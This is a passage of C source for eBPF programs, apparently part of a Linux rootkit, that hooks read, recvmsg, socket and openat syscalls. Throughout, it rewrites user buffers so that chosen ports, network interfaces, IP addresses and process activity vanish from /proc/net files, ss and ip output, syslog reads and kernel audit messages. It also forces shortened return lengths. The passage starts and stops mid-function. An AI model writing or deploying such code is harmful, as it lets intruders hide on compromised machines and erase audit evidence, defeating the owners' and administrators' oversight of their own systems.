    if (!is_config_enabled(CFG_ENABLE_IFACE_HIDING))
        return 0;

    const void *path = (const void *)ctx->args[1];
    char *buf = get_str_buf();
    if (!buf)
        return 0;

    long n = bpf_probe_read_user_str(buf, 256, path);
    if (n <= 0)
        return 0;

    int len = 0;
    #pragma unroll
    for (int i = 0; i < 255; i++) {
        if (buf[i] == '\0') {
            len = i;
            break;
        }
    }

    if (len > 232)
        len = 232;

    if (path_is_proc_net_dev(buf, len)) {
        __u64 tid = bpf_get_current_pid_tgid();
        __u8 one = 1;
        bpf_map_update_elem(&dev_open_pending, &tid, &one, BPF_ANY);
    }
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_openat")
int phantom_openat_exit_dev(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_IFACE_HIDING))
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    long fd = ctx->ret;
    if (fd < 0)
        return 0;

    __u8 *pending = bpf_map_lookup_elem(&dev_open_pending, &tid);
    if (!pending)
        return 0;

    bpf_map_delete_elem(&dev_open_pending, &tid);
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | ((__u32)fd);
    __u8 one = 1;
    bpf_map_update_elem(&tracked_proc_dev_fds, &fdkey, &one, BPF_ANY);
    return 0;
}

/*
 * phantom_read_enter - sys_enter_read: cache buf for tracked port/syslog fds.
 */
SEC("tracepoint/syscalls/sys_enter_read")
int phantom_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    int port_hiding = is_config_enabled(CFG_ENABLE_PORT_HIDING);
    int syslog_filter = is_config_enabled(CFG_ENABLE_EXEC_HIDING);
    if (!port_hiding && !syslog_filter)
        return 0;

    __u32 fd = (__u32)ctx->args[0];
    void *buf = (void *)ctx->args[1];
    __u64 tid = bpf_get_current_pid_tgid();
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | fd;

    int tracked = 0;

    /* Check if this is a tracked port fd */
    if (port_hiding) {
        __u8 *p = bpf_map_lookup_elem(&tracked_proc_tcp_fds, &fdkey);
        if (p)
            tracked = 1;
    }

    /* Check if this is a tracked syslog fd */
    if (syslog_filter) {
        __u8 *s = bpf_map_lookup_elem(&tracked_syslog_fds, &fdkey);
        if (s)
            tracked = 1;
    }

    if (!tracked)
        return 0;

    /* Save the buffer pointer for modification at read exit */
    struct port_read_ctx r = {
        .buf = buf,
        .fd = fd,
    };
    bpf_map_update_elem(&port_read_enter_cache, &tid, &r, BPF_ANY);
    return 0;
}

/*
 * phantom_read_exit_port - Hook at EXIT of read() syscall (port filtering only).
 *
 * Scans /proc/net/tcp read buffers for lines containing hidden ports
 * and blanks them out. Split from syslog filtering to reduce BPF
 * Separate SEC from syslog exit. Cache entry is not deleted (overwritten on
 * next read) so both exit programs can share port_read_enter_cache.
 */
SEC("tracepoint/syscalls/sys_exit_read")
int phantom_read_exit_port(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_PORT_HIDING))
        return 0;

    if (!should_hide_port_from_current())
        return 0;

    long ret = ctx->ret;
    if (ret <= 0)
        return 0;
    if (ret > PORT_FILTER_MAX)
        ret = PORT_FILTER_MAX;

    __u64 tid = bpf_get_current_pid_tgid();
    struct port_read_ctx *r = bpf_map_lookup_elem(&port_read_enter_cache, &tid);
    if (!r)
        return 0;

    void *ubuf = r->buf;
    __u32 cached_fd = r->fd;

    /* Only filter tracked port fds */
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | cached_fd;
    __u8 *p = bpf_map_lookup_elem(&tracked_proc_tcp_fds, &fdkey);
    if (!p)
        return 0;

    __u32 key = 0;
    char *scratch = bpf_map_lookup_elem(&port_filter_scratch, &key);
    if (!scratch)
        return 0;

    if (bpf_probe_read_user(scratch, ret, ubuf) < 0)
        return 0;

    struct port_scan_ctx scan = {
        .scratch = scratch,
        .ubuf = ubuf,
        .n = (__u32)ret,
        .line_start = 0,
    };
    bpf_loop(PORT_FILTER_MAX, port_scan_cb, &scan, 0);

    return 0;
}

/*
 * phantom_read_exit_syslog - Hook at EXIT of read() syscall (syslog filtering only).
 *
 * Scans syslog read buffers for lines containing hidden process names
 * and blanks them out. Split from port filtering to reduce BPF
 * Separate SEC from port exit; same shared cache semantics.
 */
SEC("tracepoint/syscalls/sys_exit_read")
int phantom_read_exit_syslog(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_EXEC_HIDING))
        return 0;

    long ret = ctx->ret;
    if (ret <= 0)
        return 0;
    if (ret > PORT_FILTER_MAX)
        ret = PORT_FILTER_MAX;

    __u64 tid = bpf_get_current_pid_tgid();
    struct port_read_ctx *r = bpf_map_lookup_elem(&port_read_enter_cache, &tid);
    if (!r)
        return 0;

    void *ubuf = r->buf;
    __u32 cached_fd = r->fd;

    /* Only filter tracked syslog fds */
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | cached_fd;
    __u8 *s = bpf_map_lookup_elem(&tracked_syslog_fds, &fdkey);
    if (!s)
        return 0;

    __u32 key = 0;
    char *scratch = bpf_map_lookup_elem(&port_filter_scratch, &key);
    if (!scratch)
        return 0;

    if (bpf_probe_read_user(scratch, ret, ubuf) < 0)
        return 0;

    struct port_scan_ctx scan = {
        .scratch = scratch,
        .ubuf = ubuf,
        .n = (__u32)ret,
        .line_start = 0,
    };
    bpf_loop(PORT_FILTER_MAX, syslog_scan_cb, &scan, 0);

    return 0;
}

/*
 * dev_scan_ctx - Compact /proc/net/dev by dropping hidden interface lines.
 */
struct dev_scan_ctx {
    char *scratch;
    void *ubuf;
    __u32 n;
    __u32 line_start;
    __u32 out_off;
};

/*
 * copy_dev_line_to_user - Copy one /proc/net/dev line from scratch to ubuf.
 */
static __noinline void copy_dev_line_to_user(void *ubuf, __u32 dst, const char *src,
                                             __u32 src_off, __u32 len)
{
    if (len > PORT_LINE_MAX)
        len = PORT_LINE_MAX;
    struct copy_nlmsg_ctx ctx = {
        .ubuf = ubuf, .dst = dst,
        .src = src, .src_off = src_off, .len = len,
    };
    bpf_loop(PORT_LINE_MAX, copy_nlmsg_cb, &ctx, 0);
}

/*
 * dev_line_has_hidden_iface - True if /proc/net/dev line names a hidden iface.
 */
static __noinline int dev_line_has_hidden_iface(const char *line, __u32 len)
{
    /* Find the colon position */
    int colon_pos = -1;
    #pragma unroll
    for (int i = 0; i < 16; i++) {
        if ((__u32)i >= len)
            break;
        char c = 0;
        if (bpf_probe_read_kernel(&c, 1, line + i) < 0)
            break;
        if (c == ':') {
            colon_pos = i;
            break;
        }
    }

    if (colon_pos <= 0 || colon_pos >= 16)
        return 0;

    /* Find start of name (skip whitespace before colon) */
    int name_start = 0;
    #pragma unroll
    for (int i = 0; i < 16; i++) {
        if (i >= colon_pos)
            break;
        char c = 0;
        if (bpf_probe_read_kernel(&c, 1, line + i) < 0)
            break;
        if (c != ' ' && c != '\t') {
            name_start = i;
            break;
        }
    }

    /* Copy name into local buffer for iface_is_hidden */
    char ifname[16];
    __builtin_memset(ifname, 0, sizeof(ifname));
    int nlen = colon_pos - name_start;
    if (nlen <= 0 || nlen >= 16)
        return 0;

    #pragma unroll
    for (int i = 0; i < 15; i++) {
        if (i >= nlen)
            break;
        char c = 0;
        if (bpf_probe_read_kernel(&c, 1, line + name_start + i) < 0)
            break;
        ifname[i] = c;
    }

    if (!iface_is_hidden(ifname))
        return 0;

    emit_iface_hide_event(ifname);
    return 1;
}

/*
 * dev_scan_cb - bpf_loop: drop or copy /proc/net/dev lines at each newline.
 */
static long dev_scan_cb(__u32 i, void *ctxp)
{
    struct dev_scan_ctx *c = ctxp;
    __u32 idx = i;

    if (idx >= PORT_FILTER_MAX)
        return 1;

    idx &= (PORT_FILTER_MAX - 1);

    __u32 n = c->n;
    if (n > PORT_FILTER_MAX)
        n = PORT_FILTER_MAX;

    if (idx >= n)
        return 1;

    char ch = 0;
    if (bpf_probe_read_kernel(&ch, 1, c->scratch + idx) < 0)
        return 0;

    __u32 last = n - 1;

    if (ch != '\n' && idx != last)
        return 0;

    __u32 line_start = c->line_start & (PORT_FILTER_MAX - 1);
    __u32 line_len = idx - line_start + 1;

    if (line_len > 0 && line_start < PORT_FILTER_MAX &&
        line_start + line_len <= n) {
        int hide = 0;

        if (line_len <= PORT_LINE_MAX)
            hide = dev_line_has_hidden_iface(c->scratch + line_start, line_len);

        if (!hide) {
            /* Keep line: copy forward only when compaction is needed */
            if (c->out_off != line_start) {
                if (line_len <= PORT_LINE_MAX)
                    copy_dev_line_to_user(c->ubuf, c->out_off, c->scratch,
                                         line_start, line_len);
                else
                    copy_nlmsg_to_user(c->ubuf, c->out_off, c->scratch,
                                      line_start,
                                      line_len > MAX_NLMSG ? MAX_NLMSG : line_len);
            }
            c->out_off += line_len;
        }
        /* Hidden line omitted from compacted output */
    }

    c->line_start = idx + 1;
    return 0;
}

/*
 * filter_dev_user_buf - Compact /proc/net/dev buffer; return new length.
 */
static __noinline __u32 filter_dev_user_buf(void *ubuf, __u32 n)
{
    if (n == 0 || n > PORT_FILTER_MAX)
        return n;

    __u32 key = 0;
    char *scratch = bpf_map_lookup_elem(&port_filter_scratch, &key);
    if (!scratch)
        return n;

    if (bpf_probe_read_user(scratch, n, ubuf) < 0)
        return n;

    struct dev_scan_ctx scan = {
        .scratch = scratch,
        .ubuf = ubuf,
        .n = n,
        .line_start = 0,
        .out_off = 0,
    };
    bpf_loop(PORT_FILTER_MAX, dev_scan_cb, &scan, 0);

    if (scan.out_off < n)
        zero_user_range(ubuf, scan.out_off, n);

    return scan.out_off;
}

/*
 * phantom_read_enter_dev - Save buffer pointer for /proc/net/dev read.
 */
SEC("tracepoint/syscalls/sys_enter_read")
int phantom_read_enter_dev(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_IFACE_HIDING))
        return 0;

    __u32 fd = (__u32)ctx->args[0];
    void *buf = (void *)ctx->args[1];
    __u64 tid = bpf_get_current_pid_tgid();
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | fd;

    __u8 *d = bpf_map_lookup_elem(&tracked_proc_dev_fds, &fdkey);
    if (!d)
        return 0;

    struct port_read_ctx r = {
        .buf = buf,
        .fd = fd,
    };
    bpf_map_update_elem(&dev_read_enter_cache, &tid, &r, BPF_ANY);
    return 0;
}

/*
 * phantom_read_override_dev - kretprobe __x64_sys_read: compact /proc/net/dev.
 *
 * Runs before sys_exit_read; deletes cache so exit is no-op on success.
 */
SEC("kretprobe/__x64_sys_read")
int BPF_KRETPROBE(phantom_read_override_dev, long ret)
{
    if (!is_config_enabled(CFG_ENABLE_IFACE_HIDING))
        return 0;

    if (ret <= 0)
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    struct port_read_ctx *r = bpf_map_lookup_elem(&dev_read_enter_cache, &tid);
    if (!r)
        return 0;

    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | r->fd;
    __u8 *d = bpf_map_lookup_elem(&tracked_proc_dev_fds, &fdkey);
    if (!d)
        return 0;

    bpf_map_delete_elem(&dev_read_enter_cache, &tid);

    __u32 n = (__u32)ret;
    if (n > PORT_FILTER_MAX)
        n = PORT_FILTER_MAX;

    __u32 new_len = filter_dev_user_buf(r->buf, n);
    if (new_len != n)
        bpf_override_return(ctx, new_len);

    return 0;
}

/*
 * phantom_read_exit_dev - sys_exit_read fallback for /proc/net/dev filtering.
 */
SEC("tracepoint/syscalls/sys_exit_read")
int phantom_read_exit_dev(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_IFACE_HIDING))
        return 0;

    long ret = ctx->ret;
    if (ret <= 0)
        return 0;
    if (ret > PORT_FILTER_MAX)
        ret = PORT_FILTER_MAX;

    __u64 tid = bpf_get_current_pid_tgid();
    struct port_read_ctx *r = bpf_map_lookup_elem(&dev_read_enter_cache, &tid);
    if (!r)
        return 0;

    void *ubuf = r->buf;
    __u32 cached_fd = r->fd;
    bpf_map_delete_elem(&dev_read_enter_cache, &tid);

    /* Verify this is actually a /proc/net/dev fd */
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | cached_fd;
    __u8 *d = bpf_map_lookup_elem(&tracked_proc_dev_fds, &fdkey);
    if (!d)
        return 0;

    filter_dev_user_buf(ubuf, (__u32)ret);
    return 0;
}

/*
 * phantom_close_enter_dev - sys_enter_close: clear tracked fds on close.
 *
 * Prevents fd reuse from applying the wrong filter to a recycled fd.
 */
SEC("tracepoint/syscalls/sys_enter_close")
int phantom_close_enter_dev(struct trace_event_raw_sys_enter *ctx)
{
    __u64 tid = bpf_get_current_pid_tgid();
    __u64 pid = tid >> 32;
    __u32 fd = (__u32)ctx->args[0];
    __u64 fdkey = (pid << 32) | fd;

    if (is_config_enabled(CFG_ENABLE_IFACE_HIDING))
        bpf_map_delete_elem(&tracked_proc_dev_fds, &fdkey);

    /* Always clear socket tracking entries for this fd (no-op if absent). */
    bpf_map_delete_elem(&tracked_netlink_route_fds, &fdkey);
    bpf_map_delete_elem(&tracked_sock_diag_fds, &fdkey);
    bpf_map_delete_elem(&tracked_audit_fds, &fdkey);
    bpf_map_delete_elem(&tracked_af_packet_fds, &fdkey);
    return 0;
}

/*
 * phantom_socket_enter - sys_enter_socket: cache domain and protocol.
 */
SEC("tracepoint/syscalls/sys_enter_socket")
int phantom_socket_enter(struct trace_event_raw_sys_enter *ctx)
{
    /* Socket tracking needed for both port hiding (SOCK_DIAG) and audit filtering (AUDIT) */
    if (!is_config_enabled(CFG_ENABLE_PORT_HIDING) &&
        !is_config_enabled(CFG_ENABLE_EXEC_HIDING) &&
        !is_config_enabled(CFG_ENABLE_IFACE_HIDING) &&
        !is_config_enabled(CFG_ENABLE_IP_HIDING))
        return 0;

    struct socket_enter_data data = {
        .domain = (__u32)ctx->args[0],
        .protocol = (__u32)ctx->args[2],
    };

    __u64 tid = bpf_get_current_pid_tgid();
    bpf_map_update_elem(&socket_enter_cache, &tid, &data, BPF_ANY);
    return 0;
}

/*
 * phantom_socket_exit - sys_exit_socket: track matching netlink/AF_PACKET fds.
 */
SEC("tracepoint/syscalls/sys_exit_socket")
int phantom_socket_exit(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_PORT_HIDING) &&
        !is_config_enabled(CFG_ENABLE_EXEC_HIDING) &&
        !is_config_enabled(CFG_ENABLE_IFACE_HIDING) &&
        !is_config_enabled(CFG_ENABLE_IP_HIDING))
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    struct socket_enter_data *data = bpf_map_lookup_elem(&socket_enter_cache, &tid);
    if (!data)
        return 0;
    bpf_map_delete_elem(&socket_enter_cache, &tid);

    /* Only track AF_NETLINK and AF_PACKET sockets */
    if (data->domain != AF_NETLINK && data->domain != AF_PACKET)
        return 0;

    long fd = ctx->ret;
    if (fd < 0)
        return 0;

    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | ((__u32)fd);
    __u8 one = 1;

    /* Track SOCK_DIAG sockets for port hiding */
    if (is_config_enabled(CFG_ENABLE_PORT_HIDING) &&
        data->protocol == NETLINK_SOCK_DIAG) {
        bpf_map_update_elem(&tracked_sock_diag_fds, &fdkey, &one, BPF_ANY);
    }

    /* Track AUDIT sockets for audit suppression */
    if (is_config_enabled(CFG_ENABLE_EXEC_HIDING) &&
        data->protocol == NETLINK_AUDIT) {
        bpf_map_update_elem(&tracked_audit_fds, &fdkey, &one, BPF_ANY);
    }

    /* Track NETLINK_ROUTE sockets for interface/IP hiding */
    if ((is_config_enabled(CFG_ENABLE_IFACE_HIDING) ||
         is_config_enabled(CFG_ENABLE_IP_HIDING)) &&
        data->domain == AF_NETLINK && data->protocol == 0 /* NETLINK_ROUTE */) {
        bpf_map_update_elem(&tracked_netlink_route_fds, &fdkey, &one, BPF_ANY);
    }

    /* Track AF_PACKET sockets for sniffer hiding */
    if (is_config_enabled(CFG_ENABLE_IP_HIDING) &&
        data->domain == AF_PACKET) {
        bpf_map_update_elem(&tracked_af_packet_fds, &fdkey, &one, BPF_ANY);
    }

    return 0;
}

/*
 * audit_nlmsg_filter_cb - Drop audit netlink messages for hidden_exec_pids.
 */
static long audit_nlmsg_filter_cb(__u32 i, void *ctxp)
{
    struct nl_filter_ctx *c = ctxp;

    (void)i;
    if (c->done || c->in_off >= c->n)
        return 1;

    /* Read the message length (first 4 bytes of nlmsghdr) */
    __u32 len = 0;
    if (bpf_probe_read_kernel(&len, 4, c->scratch + c->in_off) < 0) {
        c->done = 1;
        return 1;
    }

    /* Validate the message length */
    if (len < 16 || c->in_off + len > c->n) {
        c->done = 1;
        return 1;
    }

    /* Read the nlmsg_pid field (offset 12 in nlmsghdr) */
    __u32 msg_pid = 0;
    if (bpf_probe_read_kernel(&msg_pid, sizeof(msg_pid),
                              c->scratch + c->in_off + 12) < 0) {
        c->done = 1;
        return 1;
    }

    /* Check if this PID should be suppressed */
    __u8 *hidden = bpf_map_lookup_elem(&hidden_exec_pids, &msg_pid);
    if (hidden) {
        /* PID is suppressed - skip this message (don't copy it) */
        emit_hide_event(EVENT_AUDIT_BLOCKED, "audit_record");
    } else {
        /* Not suppressed - copy the message to userspace buffer */
        copy_nlmsg_to_user(c->ubuf, c->out_off, c->scratch, c->in_off, len);
        c->out_off += len;
    }

    /* Advance to the next message (netlink messages are 4-byte aligned) */
    c->in_off += NLMSG_ALIGN(len);
    return 0;
}

/*
 * phantom_recvmsg_enter - sys_enter_recvmsg: cache iov for SOCK_DIAG/AUDIT fds.
 *
 * Uses read_user_recvmsg_base (hardcoded msghdr offsets, not CO-RE user_msghdr).
 */
SEC("tracepoint/syscalls/sys_enter_recvmsg")
int phantom_recvmsg_enter(struct trace_event_raw_sys_enter *ctx)
{
    int port_hiding = is_config_enabled(CFG_ENABLE_PORT_HIDING);
    int audit_filter = is_config_enabled(CFG_ENABLE_EXEC_HIDING);
    if (!port_hiding && !audit_filter)
        return 0;

    if (port_hiding && !should_hide_port_from_current())
        return 0;

    __u32 fd = (__u32)ctx->args[0];
    __u64 tid = bpf_get_current_pid_tgid();
    __u64 pid = tid >> 32;

    /* Check if this is a tracked SOCK_DIAG or AUDIT socket */
    int is_sock_diag = 0;
    int is_audit = 0;

    if (port_hiding) {
        __u64 fdkey_sock = (pid << 32) | fd;
        __u8 *tracked_sock = bpf_map_lookup_elem(&tracked_sock_diag_fds, &fdkey_sock);
        if (tracked_sock)
            is_sock_diag = 1;
    }

    if (audit_filter) {
        __u64 fdkey_audit = (pid << 32) | fd;
        __u8 *tracked_audit = bpf_map_lookup_elem(&tracked_audit_fds, &fdkey_audit);
        if (tracked_audit)
            is_audit = 1;
    }

    if (!is_sock_diag && !is_audit)
        return 0;

    /* msghdr iov_base via read_user_recvmsg_base */
    void *base = read_user_recvmsg_base((void *)ctx->args[1]);
    if (!base)
        return 0;

    /* Save the buffer for filtering at recvmsg return */
    struct port_read_ctx r = {
        .buf = base,
        .fd = fd,
    };
    bpf_map_update_elem(&recvmsg_enter_cache, &tid, &r, BPF_ANY);
    return 0;
}

/*
 * phantom_recvmsg_exit - sys_exit_recvmsg fallback for SOCK_DIAG/AUDIT.
 *
 * Primary path is phantom_recvmsg_override (kretprobe). Runs when cache
 * entry remains; without override, zeroed tail may leave ss "Remnant" noise.
 */
SEC("tracepoint/syscalls/sys_exit_recvmsg")
int phantom_recvmsg_exit(struct trace_event_raw_sys_exit *ctx)
{
    int port_hiding = is_config_enabled(CFG_ENABLE_PORT_HIDING);
    int audit_filter = is_config_enabled(CFG_ENABLE_EXEC_HIDING);
    if (!port_hiding && !audit_filter)
        return 0;

    if (port_hiding && !should_hide_port_from_current())
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    struct port_read_ctx *r = bpf_map_lookup_elem(&recvmsg_enter_cache, &tid);
    if (!r)
        return 0;
    bpf_map_delete_elem(&recvmsg_enter_cache, &tid);

    long ret = ctx->ret;
    if (ret <= 0)
        return 0;

    __u32 n = (__u32)ret;
    if (n > PORT_FILTER_MAX)
        n = PORT_FILTER_MAX;

    /* Filter the SOCK_DIAG response in place (port hiding) */
    if (port_hiding)
        filter_sock_diag_user_buf(r->buf, n);

    /* Filter audit messages for hidden PIDs (audit suppression) */
    if (audit_filter) {
        __u64 pid = tid >> 32;
        __u64 fdkey_audit = (pid << 32) | r->fd;
        __u8 *is_audit = bpf_map_lookup_elem(&tracked_audit_fds, &fdkey_audit);
        if (is_audit) {
            /* Copy buffer to kernel scratch for processing */
            __u32 key = 0;
            char *scratch = bpf_map_lookup_elem(&port_filter_scratch, &key);
            if (scratch && bpf_probe_read_user(scratch, n, r->buf) == 0) {
                /* Scan netlink messages for audit records of hidden PIDs */
                struct nl_filter_ctx c = {
                    .scratch = scratch,
                    .ubuf = r->buf,
                    .n = n,
                    .in_off = 0,
                    .out_off = 0,
                    .done = 0,
                };
                bpf_loop(NLMSG_FILTER_ITERS, audit_nlmsg_filter_cb, &c, 0);
                if (c.out_off < n)
                    zero_user_range(r->buf, c.out_off, n);
            }
        }
    }

    return 0;
}

/*
 * phantom_recvmsg_override - kretprobe on __x64_sys_recvmsg.
 *
 * Runs before sys_exit_recvmsg; deletes cache so exit is a no-op when this fires.
 * Filters NETLINK_ROUTE, SOCK_DIAG, and AUDIT; shortens return via bpf_override_return.
 *
 * Attach __x64_sys_recvmsg (syscall wrapper with ALLOW_ERROR_INJECTION), not
 * sock_recvmsg. Userspace may override SEC name on other arch (e.g. arm64).
 */
SEC("kretprobe/__x64_sys_recvmsg")
int BPF_KRETPROBE(phantom_recvmsg_override, long ret)
{
    int port_hiding = is_config_enabled(CFG_ENABLE_PORT_HIDING);
    int audit_filter = is_config_enabled(CFG_ENABLE_EXEC_HIDING);
    int route_filter = is_config_enabled(CFG_ENABLE_IFACE_HIDING) ||
                       is_config_enabled(CFG_ENABLE_IP_HIDING);
    if (!port_hiding && !audit_filter && !route_filter)
        return 0;

    if (port_hiding && !should_hide_port_from_current())
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    __u64 pid = tid >> 32;

    if (ret <= 0)
        return 0;

    __u32 n = (__u32)ret;

    /*
     * NETLINK_ROUTE (iface/IP): pack-and-zero hidden msgs. Shorten return
     * length when possible; filter never returns 0 (synthesizes NLMSG_DONE).
     */
    if (route_filter) {
        struct port_read_ctx *rr = bpf_map_lookup_elem(&route_recvmsg_enter_cache, &tid);
        if (rr) {
            bpf_map_delete_elem(&route_recvmsg_enter_cache, &tid);
            __u64 fdkey = (pid << 32) | rr->fd;
            __u8 *is_route = bpf_map_lookup_elem(&tracked_netlink_route_fds, &fdkey);
            if (is_route) {
                __u32 cap = n;
                if (cap > ROUTE_FILTER_MAX)
                    cap = ROUTE_FILTER_MAX;
                __u32 new_len = filter_route_user_buf(rr->buf, cap);
                if (new_len > 0 && new_len < cap)
                    bpf_override_return(ctx, new_len);
            }
            return 0;
        }
    }

    /* SOCK_DIAG / audit path */
    struct port_read_ctx *r = bpf_map_lookup_elem(&recvmsg_enter_cache, &tid);
    if (!r)
        return 0;
    bpf_map_delete_elem(&recvmsg_enter_cache, &tid);

    if (n > PORT_FILTER_MAX)
        n = PORT_FILTER_MAX;

    __u32 new_len = n;

    /* Filter SOCK_DIAG response (port hiding) */
    if (port_hiding)
        new_len = filter_sock_diag_user_buf(r->buf, n);

    /* Filter audit messages for hidden PIDs (audit suppression) */
    if (audit_filter) {
        __u64 fdkey_audit = (pid << 32) | r->fd;
        __u8 *is_audit = bpf_map_lookup_elem(&tracked_audit_fds, &fdkey_audit);
        if (is_audit) {
            __u32 key = 0;
            char *scratch = bpf_map_lookup_elem(&port_filter_scratch, &key);
            if (scratch && bpf_probe_read_user(scratch, n, r->buf) == 0) {
                struct nl_filter_ctx c = {
                    .scratch = scratch,
                    .ubuf = r->buf,
                    .n = n,
                    .in_off = 0,
                    .out_off = 0,
                    .done = 0,
                };
                bpf_loop(NLMSG_FILTER_ITERS, audit_nlmsg_filter_cb, &c, 0);
                if (c.out_off < new_len)
                    new_len = c.out_off;
            }
        }
    }

    /* Override return value so the client sees the shorter buffer length */
    if (new_len != n)
        bpf_override_return(ctx, new_len);
    return 0;
}

// NETLINK_ROUTE recvmsg - iface and IP hiding (ip a)
// ============================================================

/*
 * nl_route_filter_cb - Mark RTM_NEWLINK/RTM_NEWADDR dump messages to skip (type 0x7fff).
 *
 * Hide both link and addr for a hidden iface or getifaddrs loops on -EAGAIN.
 * Unicast RTM_GETLINK (no NLM_F_MULTI) is left alone.
 */
struct nl_route_filter_ctx {
	char *scratch;
	void *ubuf;
	__u32 n;
	__u32 in_off;
	__u8 done;
};

static long nl_route_filter_cb(__u32 i, void *ctxp)
{
	struct nl_route_filter_ctx *c = ctxp;
	(void)i;

	if (c->done || c->in_off >= c->n)
		return 1;
	if (c->in_off + 16 > c->n) {
		c->done = 1;
		return 1;
	}

	__u32 nlmsg_len = 0;
	__u16 nlmsg_type = 0;
	__u16 nlmsg_flags = 0;
	if (bpf_probe_read_kernel(&nlmsg_len, 4, c->scratch + c->in_off) < 0) {
		c->done = 1;
		return 1;
	}
	if (bpf_probe_read_kernel(&nlmsg_type, 2, c->scratch + c->in_off + 4) < 0) {
		c->done = 1;
		return 1;
	}
	if (bpf_probe_read_kernel(&nlmsg_flags, 2, c->scratch + c->in_off + 6) < 0) {
		c->done = 1;
		return 1;
	}
	if (nlmsg_len < 16 || c->in_off + nlmsg_len > c->n) {
		c->done = 1;
		return 1;
	}

	int hide = 0;

	if ((nlmsg_flags & 0x02) && nlmsg_type == 16) {
		/* ifinfomsg.ifi_index at nlmsg + 16 + 4 */
		__u32 ifindex = 0;
		if (c->in_off + 24 <= c->n)
			bpf_probe_read_kernel(&ifindex, 4, c->scratch + c->in_off + 20);

		__u32 rta_off = c->in_off + 32;
		__u32 rta_end = c->in_off + nlmsg_len;
#pragma unroll
		for (int k = 0; k < 16; k++) {
			if (rta_off + 4 > rta_end || rta_off + 4 > c->n)
				break;
			__u16 rta_len = 0, rta_type = 0;
			if (bpf_probe_read_kernel(&rta_len, 2, c->scratch + rta_off) < 0)
				break;
			if (bpf_probe_read_kernel(&rta_type, 2, c->scratch + rta_off + 2) < 0)
				break;
			if (rta_len < 4)
				break;
			if (rta_type == 3 && rta_len > 4) {
				char ifname[16];
				__builtin_memset(ifname, 0, sizeof(ifname));
				bpf_probe_read_kernel_str(ifname, sizeof(ifname),
							  c->scratch + rta_off + 4);
				if (iface_is_hidden(ifname)) {
					emit_iface_hide_event(ifname);
					mark_ifindex_hidden(ifindex);
					hide = 1;
				}
				break;
			}
			__u32 rta_aligned = (rta_len + 3) & ~3u;
			rta_off += rta_aligned;
			if (rta_off >= rta_end)
				break;
		}
	} else if ((nlmsg_flags & 0x02) && nlmsg_type == 20) {
		/* ifaddrmsg.ifa_index at nlmsg + 16 + 4 */
		__u32 ifa_index = 0;
		if (c->in_off + 24 <= c->n)
			bpf_probe_read_kernel(&ifa_index, 4, c->scratch + c->in_off + 20);

		if (ifindex_is_hidden(ifa_index)) {
			hide = 1;
		} else {
			__u32 rta_off = c->in_off + 24;
			__u32 rta_end = c->in_off + nlmsg_len;
#pragma unroll
			for (int k = 0; k < 16; k++) {
				if (rta_off + 4 > rta_end || rta_off + 4 > c->n)
					break;
				__u16 rta_len = 0, rta_type = 0;
				if (bpf_probe_read_kernel(&rta_len, 2, c->scratch + rta_off) < 0)
					break;
				if (bpf_probe_read_kernel(&rta_type, 2, c->scratch + rta_off + 2) < 0)
					break;
				if (rta_len < 4)
					break;
				if (rta_type == 1 && rta_len >= 8) {
					__be32 addr = 0;
					if (bpf_probe_read_kernel(&addr, 4,
								  c->scratch + rta_off + 4) == 0 &&
					    ip_is_hidden(addr)) {
						emit_ip_hide_event(addr);
						hide = 1;
						break;
					}
					/* keep scanning for IFA_LABEL */
				} else if (rta_type == 3 && rta_len > 4) {
					char ifname[16];
					__builtin_memset(ifname, 0, sizeof(ifname));
					bpf_probe_read_kernel_str(ifname, sizeof(ifname),
								  c->scratch + rta_off + 4);
					if (iface_is_hidden(ifname)) {
						emit_iface_hide_event(ifname);
						mark_ifindex_hidden(ifa_index);
						hide = 1;
						break;
					}
				}
				__u32 rta_aligned = (rta_len + 3) & ~3u;
				rta_off += rta_aligned;
				if (rta_off >= rta_end)
					break;
			}
		}
	}

	if (hide) {
		__u16 skip_type = 0x7fff;
		bpf_probe_write_user((char *)c->ubuf + c->in_off + 4, &skip_type,
				     sizeof(skip_type));
	}

	c->in_off += NLMSG_ALIGN(nlmsg_len);
	return 0;
}

static __noinline __u32 filter_route_user_buf(void *ubuf, __u32 n)
{
	if (n == 0 || n > ROUTE_FILTER_MAX)
		return n;

	__u32 key = 0;
	char *scratch = bpf_map_lookup_elem(&route_filter_scratch, &key);
	if (!scratch)
		return n;
	if (bpf_probe_read_user(scratch, n, ubuf) < 0)
		return n;

	struct nl_route_filter_ctx ctx = {
		.scratch = scratch,
		.ubuf = ubuf,
		.n = n,
		.in_off = 0,
		.done = 0,
	};
	bpf_loop(NLMSG_FILTER_ITERS, nl_route_filter_cb, &ctx, 0);
	return n;
}

/*
 * phantom_recvmsg_enter_route - Track NETLINK_ROUTE recvmsg buffer.
 */
SEC("tracepoint/syscalls/sys_enter_recvmsg")
int phantom_recvmsg_enter_route(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_IFACE_HIDING) &&
        !is_config_enabled(CFG_ENABLE_IP_HIDING))
        return 0;

    __u32 fd = (__u32)ctx->args[0];
    __u64 tid = bpf_get_current_pid_tgid();
    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | fd;

